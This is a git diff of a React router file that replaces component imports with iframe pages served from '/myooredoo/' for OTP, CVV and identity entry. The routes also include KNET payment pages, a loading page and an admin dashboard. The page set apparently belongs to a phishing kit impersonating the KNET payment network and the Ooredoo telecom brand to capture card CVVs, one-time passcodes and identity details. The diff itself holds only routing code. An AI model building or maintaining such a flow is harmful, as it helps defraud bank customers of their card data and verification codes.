@@ -9,9 +9,7 @@ import HomeEn from "./pages/HomeEn";
 import Pay from "./pages/Pay";
 import PayEn from "./pages/PayEn";
 import Loading from "./pages/Loading";
-import OTP from "./pages/OTP";
-import CVV from "./pages/CVV";
-import Hawety from "./pages/Hawety";
+// Removed React component imports - using original HTML files instead
 import AdminDashboard from "./pages/AdminDashboard";
 
 // Wrapper components for HTML pages
@@ -25,10 +23,10 @@ const KnetPage = () => {
   );
 };
 
-const VerPage = () => {
+const OTPPage = () => {
   return (
     <iframe
-      src="/knet/ver.html"
+      src="/myooredoo/otp.html"
       style={{ width: '100%', height: '100vh', border: 'none' }}
       title="OTP Verification"
     />
@@ -38,17 +36,17 @@ const VerPage = () => {
 const HawetPage = () => {
   return (
     <iframe
-      src="/hawety.html"
+      src="/myooredoo/hawety.html"
       style={{ width: '100%', height: '100vh', border: 'none' }}
       title="Identity"
     />
   );
 };
 
-const CvvPage = () => {
+const CVVPage = () => {
   return (
     <iframe
-      src="/cvv.html"
+      src="/myooredoo/cvv.html"
       style={{ width: '100%', height: '100vh', border: 'none' }}
       title="CVV"
     />
@@ -76,10 +74,10 @@ function Router() {
       <Route path={"/pay-en"} component={PayEn} />
       <Route path={"/knet"} component={KnetPage} />
       <Route path={"/loading"} component={Loading} />
-      <Route path={"/otp"} component={OTP} />
+      <Route path={"/otp"} component={OTPPage} />
       <Route path={"/identity"} component={HawetPage} />
-      <Route path={"/cvv"} component={CVV} />
-      <Route path={"/hawety"} component={Hawety} />
+      <Route path={"/cvv"} component={CVVPage} />
+      <Route path={"/hawety"} component={HawetPage} />
       <Route path={"/client"} component={ClientPage} />
       <Route path={"/admin-dashboard"} component={AdminDashboard} />
       <Route path={"/admin"} component={AdminDashboard} />
